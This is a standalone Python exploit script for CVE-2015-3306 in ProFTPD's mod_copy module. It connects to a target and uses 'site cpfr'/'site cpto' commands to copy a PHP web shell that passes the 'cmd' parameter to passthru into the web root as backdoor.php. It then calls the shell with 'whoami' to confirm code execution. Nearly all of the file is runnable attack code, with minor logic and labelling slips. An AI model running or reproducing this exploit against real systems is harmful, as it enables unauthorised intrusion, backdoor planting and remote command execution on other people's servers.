#!/usr/bin/env python3

import re
import socket
import requests
import argparse

import logging
log = logging.getLogger(__name__)


class ProFTPD:
    def __init__(self):
        self.__sock = None
        self.__host = None
        self.__port = 80
        self.__path = "/var/www/html"

    def __connect(self):
        log.debug("[!] Connecting to ProFTPD")
        self.__sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Set a timeout
        self.__sock.settimeout(60)
        try:
            self.__sock.connect((self.__host, self.__port))
            self.__sock.settimeout(None)
            self.__sock.recv(1024)
        except Exception as e:
            log.info(f"[!] Error: {e}")
            return True

    def __exploit(self):
        log.debug("[!] In exploit for ProFTPD")
        payload = "<?php echo passthru($_GET['cmd']); ?>"
        try:
            self.__sock.send(b"site cpfr /proc/self/cmdline\n")
            self.__sock.recv(1024)
            self.__sock.send(("site cpto /tmp/." + payload + "\n").encode("utf-8"))
            self.__sock.recv(1024)
            self.__sock.send(("site cpfr /tmp/." + payload + "\n").encode("utf-8"))
            self.__sock.recv(1024)
            self.__sock.send(("site cpto "+ self.__path +"/backdoor.php\n").encode("utf-8"))
        except Exception as e:
            log.info(f"[!] Error: {e}")
            return True

        if "Copy successful" in str(self.__sock.recv(1024)):
            log.debug("[+] Target exploited, acessing shell at http://" + self.__host + "/backdoor.php")
            log.debug("[+] Running whoami: " + self.__trigger())
            log.info("[+] PHPMyAdmin is vulnerable")
            return True
        else:
            log.info("[+] ProFTPD is secure")
            return False

    def __trigger(self):
        log.debug("[!] Triggering")
        data = requests.get("http://" + self.__host + "/backdoor.php?cmd=whoami")
        match = re.search('cpto /tmp/.([^"]+)', data.text)
        return match.group(0)[11::].replace("\n", "")

    def run(self, host, port=None):
        self.__host = host
        log.info(f"[+] Exploiting ProFTPD ({self.__host})")
        if port:
            self.__port = port
        if not self.__connect():
            return True
        return self.__exploit()


def main(args):
    log.info("[+] CVE-2015-3306 exploit")
    log.info("[+] Exploiting " + args.host + ":" + args.port)

    exploit = ProFTPD()
    exploit.run(args.host, int(args.port))


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('--host', required=True)
    parser.add_argument('--port', required=True)
    args = parser.parse_args()

    main(args)
